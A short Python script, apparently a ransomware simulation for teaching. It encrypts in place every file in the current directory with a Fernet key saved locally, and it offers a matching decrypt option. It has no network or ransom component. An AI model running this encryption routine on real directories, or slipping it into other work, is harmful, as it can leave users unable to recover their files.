import os
import subprocess
import sys

try:
    from cryptography.fernet import Fernet
except ModuleNotFoundError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("encryptionKey.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    with open("encryptionKey.key", "rb") as key_file:
        return key_file.read()

def encrypt_files(key):
    fernet = Fernet(key)
    for file in os.listdir("."):

        if file in ["ransomwareSimulation.py", "encryptionKey.key", "README.md"]:
            continue
        if os.path.isfile(file): 
            with open(file, "rb") as f:
                original_data = f.read()
            encrypted_data = fernet.encrypt(original_data)
            with open(file, "wb") as f:
                f.write(encrypted_data)

def decrypt_files(key):
    fernet = Fernet(key)
    for file in os.listdir("."):

        if file in ["ransomwareSimulation.py", "encryptionKey.key", "README.md"]:
            continue
        if os.path.isfile(file):
            with open(file, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = fernet.decrypt(encrypted_data)
            with open(file, "wb") as f:
                f.write(decrypted_data)

if __name__ == "__main__":
    print("1. Encrypt files")
    print("2. Decrypt files")
    choice = input("Enter your choice: ")

    if choice == "1":
        key = generate_key()
        encrypt_files(key)
        print("Files encrypted successfully.")
    elif choice == "2":
        try:
            key = load_key()
            decrypt_files(key)
            print("Files decrypted successfully.")
        except Exception as e:
            print(f"Error during decryption: {e}")
    else:
        print("Invalid choice. Exiting.")
